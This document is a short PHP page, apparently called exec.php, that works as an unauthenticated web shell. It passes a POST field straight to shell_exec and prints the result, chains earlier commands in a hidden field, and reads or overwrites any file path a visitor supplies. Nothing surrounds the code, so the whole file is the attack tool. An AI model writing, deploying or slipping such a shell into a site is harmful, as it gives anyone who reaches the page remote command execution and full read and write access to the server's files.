<font size="7">
	<head>
		<h1>IN</h1><br>
	
		<?php
			$prev = $_POST["prev"];
			$insert = $_POST["insert"];
			$write = $_POST["write"];
			$file = $_POST["file"];
			echo $file;
			if($prev == ""){
				$in = $insert;
			} else {
				$in = $prev . "; " . $insert;							}
			echo "<h2>$in</h2><br><br>";
			if($write == ""){
				echo readfile($file);
			}else{
				$myfile = fopen($file, "w") or die("Unable to open 				file!");
				fwrite($myfile, $write);
				fclose($myfile);
			}
		?>
 
	</head>
	<body>
		<h1>OUT</h1><br>

		<?php
			$output = shell_exec($in);
			echo "<h2>$output</h2>";
		?>
		<h1>what next</h1><br>
		<form action = "/exec.php" method="post">
			<input type="text" name="insert">
			<input type="hidden" name="prev" value = '<?php echo "$in"; ?>'/>
			<input type="submit" value="submit"><br>
			leave write blank to read file<br>
			<input type = "text" name = "file"><br>
			write<br>
			<input type = "text" name = "write">
		</form>
		<form action = "/exec.php" method="post">
			<input type="submit" value="reset">
		</form>

	</body>
</font>